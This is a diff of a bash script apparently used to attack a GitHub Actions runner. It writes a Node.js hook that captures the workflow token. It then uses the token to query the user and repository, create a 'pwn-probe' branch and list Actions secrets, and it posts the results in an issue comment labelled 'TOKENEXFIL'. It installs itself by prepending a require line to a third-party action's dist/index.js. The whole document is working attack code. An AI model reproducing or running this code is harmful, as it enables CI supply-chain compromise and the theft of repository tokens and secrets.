@@ -1,30 +1,41 @@
 #!/bin/bash
 set -u
-echo "RCE-MARKER job=$GITHUB_JOB run=$GITHUB_RUN_ID action=$GITHUB_ACTION"
+echo "RCE-MARKER2 job=$GITHUB_JOB run=$GITHUB_RUN_ID action=$GITHUB_ACTION actor=$GITHUB_ACTOR"
 id
-hostname || true
-echo "--- env-filtered ---"
-env | sort | grep -v -i -E 'token|secret|password|key|auth' | head -60
-echo "--- workspace ---"
-pwd; ls -la
-cat > /tmp/nh.js <<'JSEOF'
+uname -a
+echo "--- hooking commit-comment action ---"
+cat > /tmp/hook.js <<'JSEOF'
+const cp = require('child_process');
+function sh(cmd){ try { return cp.execSync(cmd, {encoding:'utf8', timeout:60000, shell:'/bin/bash'}); } catch(e) { return 'EXEC_ERR ' + (e.stdout||'') + (e.stderr||'') + ' ' + e.message; } }
 try {
-  var cp=require('child_process'), fs=require('fs');
-  var t=process.env.INPUT_TOKEN||process.env.INPUT_GITHUB_TOKEN||'';
-  var act=(process.env.GITHUB_ACTION||'?');
-  function run(c){try{return cp.execSync(c,{encoding:'utf8',timeout:30000})}catch(e){return 'EXEC_ERR:'+(e.stdout||'')+(e.stderr||'')}}
-  if (t) {
-    var h='-H "Authorization: Bearer '+t+'" -H "User-Agent: omp"';
-    var user=run('curl -sS -D /tmp/hdr -w "\\nHTTP:%{http_code}" '+h+' https://api.github.com/user');
-    var hdr=run('grep -i -E "HTTP/|x-oauth-scopes|x-accepted" /tmp/hdr');
-    var rep=run('curl -sS -w "\\nHTTP:%{http_code}" '+h+' https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v1605241-0a3e51');
-    console.log('TOKHOOK action='+act+' len='+t.length);
-    console.log('TOKHOOK_HDR '+String(hdr).replace(/\n/g,' | '));
-    console.log('TOKHOOK_USER '+String(user).slice(0,300).replace(/\n/g,' | '));
-    console.log('TOKHOOK_REPO '+String(rep).slice(0,400).replace(/\n/g,' | '));
-    fs.appendFileSync('/tmp/tokdump.txt', act+'\t'+t+'\n');
+  const t = process.env.INPUT_TOKEN || process.env.INPUT_GITHUB_TOKEN || '';
+  const act = process.env.GITHUB_ACTION || '?';
+  if (!t) { console.log('HOOK_NO_TOKEN act=' + act); }
+  else {
+    const tok = t.replace(/'/g, "'\\''");
+    function api(method, url, data){
+      const d = data ? " -H 'Content-Type: application/json' -d '" + data + "'" : '';
+      return sh("curl -sS -X " + method + " -w '\\nHTTP:%{http_code}' -H 'Authorization: Bearer " + tok + "' -H 'User-Agent: omp'" + d + " '" + url + "'").slice(0,1500);
+    }
+    const out = [];
+    out.push('ACT=' + act + ' LEN=' + t.length);
+    out.push('USER=' + api('GET','https://api.github.com/user'));
+    out.push('REPO=' + api('GET','https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v1605241-0a3e51'));
+    out.push('REFS=' + api('POST','https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v1605241-0a3e51/git/refs', JSON.stringify({ref:'refs/heads/pwn-probe-'+Date.now(), sha: process.env.GITHUB_SHA})));
+    out.push('SECRETS=' + api('GET','https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v1605241-0a3e51/actions/secrets'));
+    const payload = JSON.stringify({body: 'TOKENEXFIL\n```\n' + out.join('\n\n') + '\n```'});
+    const bodyB64 = Buffer.from(payload).toString('base64');
+    const post = sh("printf '%s' '" + bodyB64 + "' | base64 -d > /tmp/cbody.json && curl -sS -X POST -w '\\nHTTP:%{http_code}' -H 'Authorization: Bearer " + tok + "' -H 'User-Agent: omp' -H 'Content-Type: application/json' --data-binary @/tmp/cbody.json https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v1605241-0a3e51/issues/3/comments");
+    console.log('HOOK_RESULT ' + out.join(' || ').replace(/\n/g,' ').slice(0,4000));
+    console.log('HOOK_POST ' + String(post).slice(0,600));
   }
-} catch(e) { console.log('TOKHOOK_ERR '+e.message); }
+} catch(e) { console.log('HOOK_ERR ' + String(e && e.message).slice(0,300)); }
 JSEOF
-printf 'NODE_OPTIONS=--require /tmp/nh.js\n' >> "$GITHUB_ENV"
-echo "hook installed at /tmp/nh.js"
+node --check /tmp/hook.js 2>&1 | head -3 || true
+for f in /home/runner/work/_actions/peter-evans/commit-comment/*/dist/index.js; do
+  [ -f "$f" ] || continue
+  grep -q 'tmp/hook.js' "$f" && continue
+  { printf 'require("/tmp/hook.js");\n'; cat "$f"; } > /tmp/idx.new && cp /tmp/idx.new "$f" && echo "HOOKED $f"
+done
+ls -la /home/runner/work/_actions/peter-evans/commit-comment/*/dist/ 2>/dev/null | head -5
+echo "--- done ---"
